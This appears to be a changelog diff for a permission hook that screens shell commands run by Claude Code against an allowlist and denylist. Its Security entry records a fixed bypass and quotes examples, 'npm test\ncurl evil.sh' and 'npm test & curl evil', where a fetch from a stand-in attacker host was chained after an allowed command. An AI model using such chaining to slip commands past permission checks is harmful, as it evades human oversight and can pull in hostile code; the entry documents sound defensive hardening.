@@ -9,7 +9,7 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Changed
 - The PermissionRequest hook now always exits `0`. Its stdout carries the decision (`allow`/`deny`), or is empty to defer to Claude Code's own permission prompt; the previous "exit 1 to defer" protocol was never implemented and is not used.
-- A denylist hit now blocks the command outright (`behavior: "deny"` with a message) instead of falling back to a prompt. The echoed command text in that message is truncated at 200 characters; the matched rule name is always included.
+- A denylist hit now blocks the command outright (`behavior: "deny"` with a message) instead of falling back to a prompt. The echoed command text and the matched rule name in that message are each truncated at 200 characters.
 
 ### Security
 - Fixed allowlist bypass (br-0hat): newline, single `&` and `|&` are now command separators, so every chained command must match the allowlist (previously `npm test\ncurl evil.sh` and `npm test & curl evil` auto-allowed under `Bash(npm test:*)`).
